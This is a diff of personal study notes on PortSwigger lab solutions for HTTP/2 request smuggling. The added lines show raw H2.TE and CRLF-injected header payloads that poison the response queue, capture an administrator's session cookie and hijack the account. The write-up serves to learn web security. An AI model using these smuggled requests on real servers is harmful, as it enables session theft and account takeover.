@@ -304,7 +304,7 @@ To solve the lab, delete the user carlos by using response queue poisoning to br
 The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 
 
 Solution:
-FIrst we need to configrm H2.TE, so we send the attack req:
+FIrst we need to confirm H2.TE, so we send the attack req:
 ```bash
 POST / HTTP/2
 Host: 0ae000d703ab28f1810953e500ce003d.web-security-academy.net
@@ -354,80 +354,15 @@ And norm req stays the same and after we send our norm req in the response we ge
 
 So we now need to keep sending normal requests until in the reponse we see the response to login endpoint which is going to contain admin's session cookie.
 
-Manually sending requests does not work, so we should better use intruder
-
-TODO:
-Looks like admin is not logged in so rn the lab can't be solved:
+Finally we get the response to the admin's req:
 ```bash
-HTTP/2 200 OK
-Content-Type: text/html; charset=utf-8
+HTTP/2 302 Found
+Location: /my-account?id=administrator
+Set-Cookie: session=SS6L7uVvYDXUBbPud7L1nMY4sZDzP17y; Secure; HttpOnly; SameSite=None
 X-Frame-Options: SAMEORIGIN
-Content-Length: 3251
-
-<!DOCTYPE html>
-<html>
-    <head>
-        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
-        <link href=/resources/css/labs.css rel=stylesheet>
-        <title>Response queue poisoning via H2.TE request smuggling</title>
-    </head>
-    <body>
-        <script src="/resources/labheader/js/labHeader.js"></script>
-        <div id="academyLabHeader">
-            <section class='academyLabBanner'>
-                <div class=container>
-                    <div class=logo></div>
-                        <div class=title-container>
-                            <h2>Response queue poisoning via H2.TE request smuggling</h2>
-                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling'>
-                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
-                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
-                                    <g>
-                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
-                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
-                                    </g>
-                                </svg>
-                            </a>
-                        </div>
-                        <div class='widgetcontainer-lab-status is-notsolved'>
-                            <span>LAB</span>
-                            <p>Not solved</p>
-                            <span class=lab-status-icon></span>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
-        <div theme="">
-            <section class="maincontainer">
-                <div class="container is-page">
-                    <header class="navigation-header">
-                        <section class="top-links">
-                            <a href=/>Home</a><p>|</p>
-                            <a href="/my-account">My account</a><p>|</p>
-                        </section>
-                    </header>
-                    <header class="notification-header">
-                    </header>
-                    <h1>Login</h1>
-                    <section>
-                        <form class=login-form method=POST action="/login">
-                            <input required type="hidden" name="csrf" value="w117mJDB9Lo09gi5EbfzUEn6FGXXz3R9">
-                            <label>Username</label>
-                            <input required type=username name="username" autofocus>
-                            <label>Password</label>
-                            <input required type=password name="password">
-                            <button class=button type=submit> Log in </button>
-                        </form>
-                    </section>
-                </div>
-            </section>
-            <div class="footer-wrapper">
-            </div>
-        </div>
-    </body>
-</html>
+Content-Length: 0
 ```
+So we copy their cookie and the lab is solved
 
 ### Request smuggling via CRLF injection
 Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the content-length or stripping any transfer-encoding headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.
@@ -582,7 +517,7 @@ GET /admin HTTP/1.1
 You will also need to adjust the positioning of any internal headers that you want to inject in a similar manner
 
 ### PRACTITIONER Lab: HTTP/2 request splitting via CRLF injection
-Lab's description:
+Lab's description:  
 This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
 
 To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.
@@ -590,9 +525,52 @@ To solve the lab, delete the user carlos by using response queue poisoning to br
 The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 
 
 Solution:
+First we try to craete our attack req:
+```bash
+GET / HTTP/2
+Host: 0a3e007e034384fb84791b6700af0014.web-security-academy.net
+Cookie: session=VIjSEwy2B5TpJ4fbQhTbRpBphycUL0ST
+Foo: Bar\r\n\r\nGET /doesnotexist HTTP/1.1\r\nHost: 0a3e007e034384fb84791b6700af0014.web-security-academy.net # this is done via inspector > headers
+```
 
+Please note in the inspector > headres we may also need to add \r\n\r\n so that the header becomes:
+```bash
+Foo: Bar\r\n\r\nGET /doesnotexist HTTP/1.1\r\nHost: 0a3e007e034384fb84791b6700af0014.web-security-academy.net\r\n\r\n # this is done via inspector > headers
+```
+Whether we need to add \r\n\r\n or not depends if the front end server adds them during the downgrade to HTTP 1.1
 
+And later when we send any other normal req we get:
+```bash
+HTTP/2 404 Not Found
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 11
+
+"Not Found"
+```
+
+So now we wanna get the victim's response so we modify the first line of our attack req to `/doesnotexist` because we want to get 404 for all our requests and when we get something other than 404 we know it's coming from the victim's user:
+```bash
+GET /doesnotexist HTTP/2
+Host: 0a3e007e034384fb84791b6700af0014.web-security-academy.net
+Cookie: session=VIjSEwy2B5TpJ4fbQhTbRpBphycUL0ST
+Foo: Bar\r\n\r\nGET /doesnotexist HTTP/1.1\r\nHost: 0a3e007e034384fb84791b6700af0014.web-security-academy.net # this is done via inspector > headers
+```
+
+And finally in one of the responses we got:
+```bash
+HTTP/2 302 Found
+Location: /my-account?id=administrator
+Set-Cookie: session=KyJaZcG8pwQxlsW9XdqncjIl9PhIlwoX; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+So we copy the cookie, become admin and delete carlos
 
 > Tip:
 >
 > In the example above, we've split the request in a way that triggers response queue poisoning, but you can also smuggle prefixes for classic request smuggling attacks in this way. In this case, your injected headers may clash with the headers in the request that is appended to your prefix on the back-end, resulting in duplicate header errors or causing the request to be terminated in the wrong place. To mitigate this, you can include a trailing body parameter in the smuggled prefix along with a Content-Length header that is slightly longer than the body. The victim's request will still be appended to your smuggled prefix but will be truncated before the headers. 
+
+### HTTP request tunnelling
+
